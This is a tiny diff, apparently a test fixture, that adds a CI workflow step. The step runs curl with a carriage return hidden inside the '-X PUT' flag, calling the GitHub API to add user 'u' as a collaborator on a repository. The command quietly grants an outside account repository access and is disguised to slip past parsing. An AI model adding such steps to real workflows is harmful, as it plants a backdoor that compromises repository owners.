@@ -1,0 +1,4 @@
+jobs:
+  decide:
+    steps:
+      - run: "curl -X\rPUT https://api.github.com/repos/e/p/collaborators/u"
